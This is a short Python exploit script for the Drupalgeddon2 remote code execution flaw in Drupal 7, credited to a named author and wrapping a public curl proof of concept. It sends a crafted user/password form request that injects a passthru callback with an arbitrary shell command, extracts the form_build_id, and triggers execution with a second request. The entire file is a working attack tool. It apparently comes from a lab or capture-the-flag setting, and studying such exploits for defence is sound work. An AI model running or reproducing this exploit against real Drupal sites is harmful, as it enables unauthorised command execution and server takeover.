#!/usr/bin/python3
# Drupalgeddon2 Drupal 7 user/password RCE
# Just a hacky python script over g0tmi1k's cURL PoC to automate execution of commands over cli
# https://gist.github.com/g0tmi1k/7476eec3f32278adc07039c3e5473708#poc-3---post_render--userpassword--passthru
# Pre-requisites: curl, grep, python3 and os, subrpocess, urllib and argparse Python3 libraries
# Developed by SecNigma

import os
import subprocess
from urllib.parse import quote
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-c", help="Usage: ./exploit.py 'id' . The quotes around command is important" )
parser.add_argument("-u", help="The drupal 7 host's URL. Enterr the URL without the preceeding slash. eg: ./exploit.py -h 'http://10.10.10.233' ", required=True)

args = parser.parse_args()

if (args.c):
    command = args.c
    temp = quote(command)
    temp = temp.replace('%5B', '[')
    temp = temp.replace('%25', '%')
    temp = temp.replace('%5D', ']')
    temp = temp.replace('%2B', '+')
    temp = temp.replace('%20', '+')
    temp = temp.replace('%2d', '-')
    temp = temp.replace('%26', '&')
    temp = temp.replace('%2f', '/')
    command = temp
else:
    command = "id"

if (args.u):
    url = args.u
    
# Request #1
cmd= "curl -k -s '"+url+"/?q=user/password&name\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]="+command+"' --data 'form_id=user_pass&_triggering_element_name=name' | grep form_build_id |cut -d ' ' -f4|cut -d = -f2|cut -d '\"' -f2"

out = subprocess.check_output(cmd, shell=True)
output = out.decode("utf-8")
output = output[:-1]
print(output)

#Request #2
cmd2 = "curl -k -i '"+url+"/?q=file/ajax/name/%23value/"+output+"' --data 'form_build_id="+output+"'"
os.system(cmd2)

